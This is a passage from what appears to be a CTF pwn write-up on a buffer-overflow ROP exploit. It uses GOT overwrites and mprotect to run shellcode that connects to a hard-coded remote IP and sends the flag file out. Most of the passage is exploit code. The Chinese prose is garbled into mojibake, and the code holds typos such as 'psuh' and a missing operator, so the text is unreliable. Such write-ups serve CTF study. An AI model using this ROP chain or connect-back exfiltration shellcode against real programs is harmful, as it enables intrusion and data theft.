src="/../img/2706180-20220426102259813-2020062452.png"></p><p>ä¹Ÿæ²¡æœ‰raxâ€¦ï¼Œç¨‹åºé‡Œä¹Ÿæ²¡æœ‰ä»»ä½•ä¸raxæœ‰å…³çš„æŒ‡ä»¤ã€‚</p><p>ä½†æ˜¯libcé‡Œå•¥éƒ½æœ‰ï¼Œå› æ­¤æˆ‘ä»¬çš„å¯¹ç­–æ˜¯åœ¨libcé‡Œæ‰¾åˆ°pop rax ; retæŒ‡ä»¤ï¼Œç„¶åå°†å…¶è¦†å†™åˆ°æ— ç”¨å‡½æ•°çš„gotè¡¨é‡Œã€‚</p><p>ç»§ç»­é‡‡ç”¨magic gadgetã€‚å¤§è‡´æ€è·¯å°±æ˜¯å»æ‹¿åˆ°libcä¸­æ— ç”¨å‡½æ•°çš„åç§»å†æ‹¿åˆ°libcä¸­pop rax;retçš„åç§»ï¼Œç„¶åè®¡ç®—äºŒè€…åç§»æ”¾å…¥ebxï¼Œç„¶årbp-0x3då†™å…¥æ— ç”¨å‡½æ•°çš„gotåœ°å€ï¼Œæ‰§è¡Œmagic gadgetå³å¯ã€‚å»libcä¸­æ‰¾å‡½æ•°åç§»çš„æ—¶å€™è¸©äº†ä¸ªå‘ï¼Œåœ¨æ–‡æœ«è®°å½•äº†ä¸€ä¸‹ã€‚</p><p>æ¥ç€æ€è·¯å°±å¾ˆç®€å•äº†ï¼Œç”¨magic gadgetå‡­ç©ºé€ å‡ºæ¥æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ï¼Œç„¶åå»ç”¨ret2syscallçš„æ‰‹æ³•æ¥æ‰§è¡Œsocket+connect+open+read+writeå‡½æ•°å³å¯ã€‚çœŸçš„è¿™ä¹ˆç®€å•ä¹ˆï¼Ÿ æˆ‘ä»¬ä¼¼ä¹å¿˜è®°äº†ï¼Œè¿™é“é¢˜æ˜¯æœ‰æº¢å‡ºé™åˆ¶çš„ã€‚0x1b0ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œçœ‹èµ·æ¥å¾ˆå¤šï¼Œä½†æ˜¯çœŸæ­£å®ç°èµ·æ¥åˆšæ‰çš„æ€è·¯ä¼šå‘ç°æº¢å‡ºè¿œè¿œä¸å¤Ÿã€‚</p><p>ä¸‹é¢æ˜¯ä¸Šé¢æ€è·¯æ‰€å¯¹åº”çš„expï¼ˆä¸æƒ³ä»”ç»†ç ”ç©¶çš„å¯ä»¥ä¸ç ”ç©¶ï¼Œæ¯•ç«Ÿè¿™ä¸ªä¸æ˜¯æœ¬é¢˜æ­£ç¡®çš„expï¼Œåªæ˜¯æ”¾ä¸€ä¸‹ä¸Šé¢æ€è·¯çš„expï¼ˆè¿™ä¸ªå¦‚æœæº¢å‡ºè¶³å¤Ÿçš„è¯ï¼Œè¿™ä¸ªexpæ˜¯å¯ä»¥æ‰“é€šçš„ï¼‰ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x40086A</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">gadget=<span class="number">0x4008fa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ­¤æ—¶åœ¨å°†flagå†™å…¥bssæ®µ</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=<span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span><span class="comment">#è¿™é‡Œå³ä½¿æœ€åebxåªèƒ½ä¼ é€å‰å››å­—èŠ‚ï¼Œä½†ä¾ç„¶è¦ç”¨\x00æ¥è¡¥é½</span></span><br><span class="line"><span class="comment"># ä¸ç„¶ä¼šå¯¼è‡´åé¢åœ°å€ä¸flagä¼šåœ¨åŒä¸€ä¸ªå†…å­˜å•å…ƒ</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ­¤æ—¶åœ¨å°†sockaddrç»“æ„å†™å…¥bssæ®µ</span></span><br><span class="line"><span class="comment"># 127.0.0.1 1000 å…¶ä¸­0100007fä¸º127.0.0.1 e803 ä¸º03e8å³1000ï¼Œ0002ä¸ºAF_INET</span></span><br><span class="line"><span class="comment">#ä¸‹é¢ä¸¤éƒ¨åˆ†ï¼Œæ˜¯åœ¨å‡‘é½p64(0x0100007fe8030002),å› ä¸ºebpä¸€æ¬¡åªèƒ½ä¼ å››å­—èŠ‚ï¼Œå› æ­¤è¦ä¼ ä¸¤æ¬¡</span></span><br><span class="line"><span class="comment">#è¿™ä¸ªå›ç¯åœ°å€å¯ä»¥æ”¹æˆâ¾ƒâ¼°çš„æœåŠ¡å™¨çš„ipç«¯â¼ï¼ˆä»¥æ­¤åœ¨æ¯”èµ›å½“åšæ‹¿åˆ°è¿œç¨‹çš„flagï¼‰</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0xe8030002</span>)<span class="comment">#åŒä¸Šï¼Œå³ä½¿æœ€åebxåªä¼ é€å››å­—èŠ‚ï¼Œä½†ä¾ç„¶è¦ç”¨p64æ¥æ”¾åˆ°æ ˆé‡Œï¼Œç”¨æ¥ä¿æŒä¸€ä¸ªå®Œæ•´çš„å†…å­˜å•å…ƒ</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">8</span>+<span class="number">0x3d</span>)<span class="comment">#è¿™é‡ŒåŠ 8æ˜¯è¦è·³è¿‡flagæ‰€å¤„çš„æ•´ä¸ªå†…å­˜å•å…ƒ</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x0100007f</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">12</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹alarmçš„gotè¡¨ä¸ºsyscallåœ°å€</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x5</span>)</span><br><span class="line">payload+=p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl libcåç§»0x122210</span></span><br><span class="line"><span class="comment">#pop_rax_pop_rdx_pop_rbxçš„åç§»ä¸º0x166241</span></span><br><span class="line"><span class="comment">#æ‰§è¡Œå®Œä¸‹é¢çš„å†…å®¹ä¹‹åï¼Œprctlå‡½æ•°çš„gotè¡¨è£…çš„æ˜¯pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x4008da</span>)</span><br><span class="line">payload+=p64(<span class="number">0x44031</span>)</span><br><span class="line">payload+=p64(prctl_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x400618</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¥ä¸‹æ¥æ‰§è¡Œçš„å†…å®¹æ˜¯</span></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,bss_addr+400,0x30)</span></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)ipv6,é¢å‘è¿æ¥çš„å¥—æ¥å­—,tcpä¼ è¾“åè®®</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(prctl_plt_addr)<span class="comment">#pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x29</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbxæ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(alarm_plt_addr)<span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(soc,struct_socket_addr,sizeof(struct_socket)</span></span><br><span class="line"><span class="comment">#è°ƒè¯•socketå‘ç°ï¼Œæ‰§è¡Œä¹‹åï¼Œç„¶åçš„raxå€¼æ˜¯0ï¼Œå› æ­¤connectçš„rdiä¸º0</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15æ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">42</span>)</span><br><span class="line">payload+=p64(<span class="number">16</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbxæ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#15æ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rdxæ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbxæ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(open_return_value,bss+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15æ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbxæ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15æ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbxæ— ç”¨å¯„å­˜å™¨</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220426102311543-185742101.png"></p><p>å‘ç°ç°åœ¨çš„payloadæ˜¯0x2e0â€¦  å› æ­¤è¿˜è¦æ¢ä¸€ä¸‹æ–¹æ³•ï¼Œå¤§è‡´æ€è·¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯ç°åœ¨è¦è€ƒè™‘çš„æ˜¯æ€ä¹ˆè®©payloadæ›´çŸ­ï¼Œå…¶å®è§‚å¯Ÿä¸€ä¸‹ä¸Šé¢çš„payloadå°±ä¼šå‘ç°å¾ˆå¤šå­—èŠ‚å…¶å®éƒ½æ˜¯è¢«æµªè´¹æ‰äº†ï¼Œå› ä¸ºp64()æ‰“åŒ…å°±å¡«å……äº†éå¸¸å¤šçš„0ï¼ˆå¦‚ä¸‹å›¾ï¼‰<br><img src="/../img/2706180-20220426102321696-469048676.png"></p><h2 id="è¯•ç€ä½¿ç”¨shellcodeï¼Ÿ"><a href="#è¯•ç€ä½¿ç”¨shellcodeï¼Ÿ" class="headerlink" title="è¯•ç€ä½¿ç”¨shellcodeï¼Ÿ"></a>è¯•ç€ä½¿ç”¨shellcodeï¼Ÿ</h2><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå¯¹åº”æ±‡ç¼–æŒ‡ä»¤çš„æœºå™¨ç ï¼Œå¹¶ä¸”æˆ‘ä»¬ç›´æ¥å°†å¯¹åº”çš„æœºå™¨ç å‘è¿‡å»ï¼Œé‚£å²‚ä¸æ˜¯å°±æŠŠp64æ‰“åŒ…å‡ºç°å¾ˆå¤š00çš„é—®é¢˜ç»™è§£å†³äº†ä¹ˆã€‚</p><p>æƒ³æ‰§è¡Œshellcodeå…¶å®ä¹Ÿéå¸¸ç®€å•ï¼Œåªéœ€è¦æ‰§è¡Œmprotectè¿™ä¸ªå‡½æ•°æŠŠä¸€é¡µå†…å­˜å±æ€§ç»™æ”¹æˆå¯è¯»å¯å†™å¯æ‰§è¡Œå°±okäº†ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸å†å»ç”¨ret2syscallçš„æ‰‹æ³•å¸ƒç½®ropé“¾äº†ï¼Œå…ˆå»æ‰§è¡Œmprotectï¼Œç„¶åå°†æˆ‘ä»¬æ ˆä¸­å¸ƒç½®çš„shellcodeæ‹·è´åˆ°bssæ®µï¼Œæœ€åæ‰§è¡Œshellcodeã€‚</p><p>ä¸è¿‡éšä¹‹äº§ç”Ÿäº†å‡ ä¸ªé—®é¢˜</p><blockquote><p>1ã€ä¸ºä»€ä¹ˆè¦æŠŠshellcodeæ‹·è´åˆ°bssæ®µï¼Ÿ</p><p>ç­”ï¼šç”±äºæ ˆåŸºå€éšæœºåŒ–ï¼Œæˆ‘ä»¬æ— æ³•ç”¨mprotectå‡½æ•°å‡†ç¡®çš„æ”¹å˜æ ˆçš„å±æ€§ï¼Œä½†æ˜¯bssæ®µçš„åœ°å€æ˜¯ç¡®å®šçš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨mprotectå‡½æ•°ä¿®æ”¹bssæ®µå±æ€§ï¼Œç„¶ååªéœ€è¦å°†shellcodeè¿ç§»åˆ°bssæ®µå³å¯ã€‚</p><p>2ã€æ€ä¹ˆå°†shellcodeæ‹·è´åˆ°bssæ®µï¼Ÿ</p><p>åˆ©ç”¨rep movs qword ptr [rdi],qword ptr[rsi] ; retæŒ‡ä»¤ï¼Œ<strong>è¿™ä¸ªæŒ‡ä»¤å°±æ˜¯å°†rsiæŒ‡å‘çš„å†…å®¹èµ‹ç»™rdiæŒ‡å‘çš„å†…å®¹</strong>ï¼ŒåŒæ—¶æ‰§è¡Œå®Œæ¯•årsiå’Œrdiä¼šè‡ªåŠ¨å¢åŠ ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œä¸æ–­å¾ªç¯è¯¥è¿‡ç¨‹ï¼Œå¾ªç¯çš„æ¬¡æ•°ç”±rcxå¯„å­˜å™¨çš„å€¼å†³å®šï¼ˆæ¯æ¬¡å‡1ï¼Œå‡åˆ°0ä¸ºæ­¢ï¼‰</p><p>3ã€æ€ä¹ˆå°†æ‰§è¡ŒæµåŠ«æŒåˆ°bssæ®µï¼Ÿ</p><p>hh,è¿™ä¸ªé—®é¢˜æƒ³è§£å†³çš„è¯ï¼Œè¦å»è°ƒè¯•ï¼Œæœ€åæˆ‘è§£é‡Šä¸€ä¸‹ã€‚</p></blockquote><h1 id="æ­£æ–‡å¼€å§‹â€”â€”æ„é€ æ­£ç¡®çš„exp"><a href="#æ­£æ–‡å¼€å§‹â€”â€”æ„é€ æ­£ç¡®çš„exp" class="headerlink" title="æ­£æ–‡å¼€å§‹â€”â€”æ„é€ æ­£ç¡®çš„exp"></a>æ­£æ–‡å¼€å§‹â€”â€”æ„é€ æ­£ç¡®çš„exp</h1><p>å››åƒå­—äº†â€¦  ç°åœ¨æ‰æ¥åˆ°äº†å¦‚ä½•æ„å»ºæœ¬é¢˜æ­£ç¡®çš„exp</p><p>ç¬¬ä¸€ä»¶äº‹ï¼Œæˆ‘ä»¬éœ€è¦é€ ä¸€ä¸ªmprotectå‡½æ•°ã€‚æˆ‘ä»¬é‡‡ç”¨çš„æ–¹æ³•æ˜¯ç”¨magic_gadgetå°†alarmå‡½æ•°çš„gotè¡¨ä¿®æ”¹ä¸ºmprotectå‡½æ•°çš„çœŸå®åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offsetalarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure><p>ç°åœ¨æƒ³æ§åˆ¶rbxå’Œrbpçš„è¯åªèƒ½æ‰§è¡Œcsuç‰‡æ®µï¼Œä¸è¿‡è¿™ä¸ªç¼ºç‚¹éå¸¸æ˜æ˜¾ï¼Œç›´æ¥å¡«å……äº†32å­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼Œä½†æ˜¯æ²¡åŠæ³•ï¼Œæš‚æ—¶åªèƒ½ç”¨csuç‰‡æ®µæ¥æ§åˆ¶rbxå’Œrbpã€‚</p><p>ç¬¬äºŒä»¶äº‹ï¼Œå°±æ˜¯æ‰§è¡Œmprotectå‡½æ•°ï¼Œåªæœ‰æ”¹å˜äº†bssæ®µçš„å†…å­˜å±æ€§ï¼Œæˆ‘ä»¬æ‰å¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)<span class="comment">#æ‰§è¡Œcsuç‰‡æ®µä¼ å‚ï¼Œè¿™æ²¡ä»€ä¹ˆå¥½è¯´çš„</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)<span class="comment">#è¿™ä¸ªå°±æ˜¯æ˜ å°„åˆ°bssçš„å†…å­˜é¡µåœ°å€</span></span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„bssæ®µå·²ç»å˜æˆäº†å¯è¯»å¯å†™å¯æ‰§è¡Œï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220426103623192-486607434.png"></p><p>é‚£æˆ‘ä»¬ç°åœ¨è¦ç«‹åˆ»é€ å‡ºæ¥pop_rbx_pop_rbp_retè¿™ä¸ªæŒ‡ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬æ¥ä¸‹æ¥è¿˜è¦ç”¨å‡ æ¬¡magic_gadgetï¼Œä½†æ˜¯ä¸èƒ½æ¯æ¬¡ä½¿ç”¨éƒ½æ‰§è¡Œä¸€æ¬¡csuç‰‡æ®µå§ï¼Œè¿™æ ·çš„è¯è‚¯å®šæœ€åçš„payloadä¼šè¶…é•¿ã€‚é€ è¿™ä¸ªæŒ‡ä»¤å¾ˆç®€å•ï¼Œå› ä¸ºbssæ®µå·²ç»å¯æ‰§è¡Œï¼ˆ<strong>å°±æ˜¯æˆ‘ä»¬å¾€bssæ®µå†™çš„å†…å®¹éƒ½å¯ä»¥è¢«å½“åšæŒ‡ä»¤æ¥ç”¨</strong>ï¼‰ï¼Œæœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼Œç›´æ¥æŠŠéœ€è¦é€ çš„æŒ‡ä»¤å¯¹åº”æœºå™¨ç å†™åˆ°bssæ®µä¸Šï¼ˆä¸Šæ–‡å·²ç»æè¿‡åˆ©ç”¨magic_gadgetå¾€bssæ®µå†™å…¥æ•°æ®äº†ï¼‰</p><p>è¿™ä¸ªç½‘ç«™å¯ä»¥åœ¨çº¿æ±‡ç¼–æŒ‡ä»¤è½¬æœºå™¨ç    <a href="(https://defuse.ca/online-x86-assembler.htm#disassembly)">here</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¾€bss_addr+0x10å†™å…¥pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line"><span class="comment">#5B5D59C3ä¸ºpop rbx;pop rbp;pop rcx;retçš„æœºå™¨ç ï¼Œç”±äºp64()æ‰“åŒ…ä¼šå°†æ•°æ®è¿›è¡Œå°ç«¯åºå¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æå‰æ‰‹åŠ¨å°ç«¯åºå¤„ç†ä¸€æ¬¡ï¼Œä»¥æ¥ç¡®ä¿æŒ‡ä»¤æ˜¯æ­£å¸¸é¡ºåºå­˜å…¥bssæ®µçš„</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å†æ‰§è¡Œmagic_gadgetå°±å¯ä»¥ç›´æ¥ç”¨bss_addr+0x10ä¸­å­˜æ”¾çš„pop rbx;pop rbp;pop rcx;retï¼ˆè‡³äºä¸ºä»€ä¹ˆè¿˜è¦pop rcxï¼Œå› ä¸ºè¿™æ ·ä¼šæ›´çœå­—èŠ‚ï¼Œåé¢å°±ä¸ç”¨ä¸“é—¨é€ ä¸€ä¸ªpop rcx;retæŒ‡ä»¤äº†ï¼‰</p><p>æ¥ç€æˆ‘ä»¬éœ€è¦å†é€ ä¸¤ä¸ªæŒ‡ä»¤ï¼Œåˆ†åˆ«æ˜¯:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3 </span><br><span class="line">mov rsi,rsp;ret #4889E6C3</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå¾ˆå¥½ç†è§£ï¼Œæ˜¯è´Ÿè´£æ‹·è´çš„repï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨ç¬¬äºŒä¸ªæŒ‡ä»¤å‘¢ï¼Ÿè€ƒè™‘ä¸€ä¸‹æˆ‘ä»¬ä½¿ç”¨repçš„æ—¶å€™æ€ä¹ˆå»æ§åˆ¶è¿™ä¸ªrsi,æˆ‘ä»¬æœ¬æ¥æ˜¯æ§åˆ¶ä¸äº†ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜éœ€è¦è¿™ä¸ªrsiæŒ‡å‘å½“å‰æ ˆé¡¶çš„å†…å®¹ï¼ˆå› ä¸ºrepæŒ‡ä»¤ä¸‹é¢å°±æ˜¯shellcodeäº†ï¼‰ï¼Œå› æ­¤æ‰éœ€è¦é€ ä¸€ä¸ªè¿™ä¸ªgadgetå‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¾€bss_addrå†™å…¥ rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#ç°åœ¨bss_addr+0x10å°±ç›¸å½“äºpop rbx;pop rbp;pop rcx;retè¿™ä¸ªæŒ‡ä»¤äº†</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾€bssæ®µ+0x8å†™å…¥mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure><p>è‡³æ­¤æ‰€æœ‰å‡†å¤‡å·¥ä½œå®Œæˆï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯æ‰§è¡ŒrepæŒ‡ä»¤å¹¶ä¸”å¸ƒç½®shellcodeäº†</p><p>shellcodeå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#socket(2,1,0)</span><br><span class="line">push 2</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">psuh 0</span><br><span class="line">pop rdx</span><br><span class="line">push 41</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#connect(0,socket_struct_addr,0x8)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rcx,0x13589c5282230002 #å¦‚æœæ‰“æœ¬åœ°çš„è¯ï¼Œè¿™é‡Œæ”¹æˆ0x0100007fe8030002 å¯¹åº”çš„ipå’Œç«¯å£ä¸º127.0.0.1 1000</span><br><span class="line">#pushæ²¡æ³•ç›´æ¥å‹å…¥0x13589c5282230002ï¼Œåªèƒ½é€šè¿‡å¯„å­˜å™¨ä¸­è½¬</span><br><span class="line">push rcx </span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 0x10</span><br><span class="line">pop rdx</span><br><span class="line">push 42</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp#æœ¬æ¥è¿™é‡Œä¸ºäº†æ›´çŸ­åº”è¯¥ä½¿ç”¨push rsp;pop 